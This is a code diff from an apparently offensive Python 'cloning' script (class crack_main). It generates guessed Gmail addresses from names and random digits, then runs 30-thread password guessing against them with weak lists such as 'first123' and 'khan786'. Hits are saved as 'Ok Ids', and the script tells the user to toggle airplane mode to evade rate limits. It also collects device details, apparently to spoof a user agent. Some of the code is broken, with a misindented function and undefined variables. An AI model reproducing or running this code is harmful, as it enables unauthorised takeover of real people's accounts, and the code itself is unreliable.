@@ -416,42 +416,12 @@ class crack_main():
                         limit = 5000
                 print(50*'=')
                 print(' Getting gmails...')
-                lists = ['3','4']
                 for nmbr in range(limit):
-                        lchoice = random.choice(lists)
-                        if '3' in lchoice:
-                                mail = ''.join(random.choice(string.digits) for _ in range(3))
-                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        else:
-                                mail = ''.join(random.choice(string.digits) for _ in range(4))
-                                open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        zee = open('mail.txt', 'r').read().splitlines()
-                with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(zee))
-                        os.system('clear')
-                        print(logo)
-                        print(' Total Ids : '+str(len(total)))
-                        print(' Cloning Is Started Wait For Results')
-                        print(' After Every 5 Min Turn Airplane On/Off')
-                        print(50*'=')
-                        for user in zee:
-                                iid,names = user.split('|')
-                                first_name = names.rsplit(' ')[0]
-                                try:
-                                        last_name = names.rsplit(' ')[1]
-                                except IndexError:
-                                        last_name = 'Khan'
-                                fs = first_name.lower()
-                                ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                formSubmit.submit(self.m1,iid,name,passlist)
-                print(50*'=')
-                print(' SucessFully Process Is Completed ')
-                print(' Total Ok Ids : '+str(len(ok)))
-                print(' Ok Ids Save In : /sdcard/zee_ok.txt')
-                print(50*'=')
-                input('\n Press enter to back ')
-                main()
+                        nmpp = random.randint(99,9999)
+                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
+                        naseeb = open('mail.txt','a').write(nmp)
+                self.id = open('mail.txt').read().splitlines()
+                self.zee()
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo)
@@ -526,6 +496,24 @@ class crack_main():
 
         def pasw(self):
                 passlist = []
+                if not os.path.exists('device_info.txt'):
+                        os.system('clear')
+                        print(logo)
+                        print(" what is your andriod version ex 8,9,10")
+                        version_=input(' type andriod version : ')
+                        print(44*'=')
+                        print(" your mobile module name ex Techno LD7 etc")
+                        model_=input(" module name : ")
+                        print(44*"=")
+                        print(" your mobile company name ex Techno,Redmi")
+                        brand_name_=input(" device company name : ")
+                        print(44*'=')
+                        print(" your mobile width ex 720,740,730,780 etc")
+                        width_=input(" device width : ")
+                        print(44*'=')
+                        print(" your mobile height ex 1660,1780,1730 etc")
+                        height_=input(" device height : ")
+                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo)
                 print(' for auto password list type auto or Auto')
@@ -535,11 +523,11 @@ class crack_main():
                         passlist.append('first123')
                         passlist.append('first12345')
                         passlist.append('first1234')
-                        passlist.append('first12')
-                        passlist.append('firstlast')
-                        passlist.append('first last')
+                        passlist.append('khan12')
+                        passlist.append('khankhan')
+                        passlist.append('khan123')
                         passlist.append('first786')
-                        passlist.append('last12')
+                        passlist.append('first12')
                         passlist.append('first1122')
                         passlist.append('last123')
                         passlist.append('last12')
@@ -566,7 +554,34 @@ class crack_main():
                 print(50*'=')
                 input('\n Press enter to back ')
                 main()
-
+def zee(self):
+                passlist = []
+                os.system('clear')
+                print(logo)
+                print(' for auto password list type auto or Auto')
+                print(50*"=")
+                print(' Example first123,last123,khan123,firstlast')
+                print(50*"=")
+                for cd in range(int(pl)):
+                        passlist.append(input(f' ({cd+1}) Password : '))
+                os.system('clear')
+                print(logo)
+                print(' Total Ids : '+str(len(self.id)))
+                print(' Cloning Is Started Wait For Results')
+                print(' After Every 5 Min Turn Airplane On/Off')
+                print(50*'=')
+                with ThreadPool(max_workers=30) as formSubmit:
+                        for user in self.id:
+                                iid,name = user.split('|')
+                                formSubmit.submit(self.m1,iid,name,passlist)
+                print(50*'=')
+                print(' SucessFully Process Is Completed ')
+                print(' Total Ok Ids : '+str(len(ok)))
+                print(' Ok Ids Save In : /sdcard/zee_ok.txt')
+                print(50*'=')
+                input('\n Press enter to back ')
+                main()
+                
 def create_file():
         os.system('clear')
         print(logo)
